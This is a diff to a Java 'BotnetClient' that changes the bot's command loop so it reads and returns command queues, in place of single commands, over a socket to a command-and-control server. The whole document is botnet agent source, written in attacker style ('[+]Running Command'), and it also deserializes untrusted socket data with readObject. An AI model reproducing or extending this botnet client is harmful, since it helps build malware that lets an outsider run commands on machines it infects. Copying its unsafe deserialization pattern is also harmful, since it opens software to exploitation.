@@ -5,12 +5,13 @@ import java.io.*;
  * BotnetClient Class:
  * Object used to receive commands from server, process them, and send back to server
  */
-public class BotnetClient {
+public class BotnetClient{
     public static void main(String[] args) throws IOException {
         //Properties
         ObjectInputStream in = null;
         ObjectOutputStream out = null;
         Command inCommand = null;
+        CommandQueue inQueue = null;
         Socket socket = null;
         CommandProtocol commandP = new CommandProtocol();
         
@@ -29,7 +30,7 @@ public class BotnetClient {
             socket = new Socket(hostName, portNumber);
             out = new ObjectOutputStream(socket.getOutputStream());
             in = new ObjectInputStream(socket.getInputStream());
-            inCommand = (Command) in.readObject();
+            inQueue = (CommandQueue) in.readObject();
         } catch (UnknownHostException e) {
             System.err.println("[-]Don't know about host " + hostName);
             System.exit(1);
@@ -43,7 +44,9 @@ public class BotnetClient {
         }
 
         //While there are commands being sent from the server
-        while (inCommand != null){
+        while(inQueue != null){
+            inCommand = inQueue.take();
+            
             System.out.println("[+]Running Command " + inCommand.getCommandName());
             
             //get result from processing command
@@ -56,7 +59,8 @@ public class BotnetClient {
             // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());
 
             //send command back to server
-            out.writeObject(inCommand);
+            inQueue.put(inCommand);
+            out.writeObject(inQueue);
             //if the command running had an error then close the connection 
             if (inCommand.getErrorStatus() && inCommand.getIsExecuted()){
                 break;
@@ -66,7 +70,7 @@ public class BotnetClient {
                 //if there was no error
                 if (!inCommand.getErrorStatus())
                     //get the next command
-                    inCommand = (Command) in.readObject();
+                    inQueue = (CommandQueue) in.readObject();
             }
             catch (ClassNotFoundException cnfe){
                 System.err.println("[-]BotNetClient: Problem reading object: class not found");
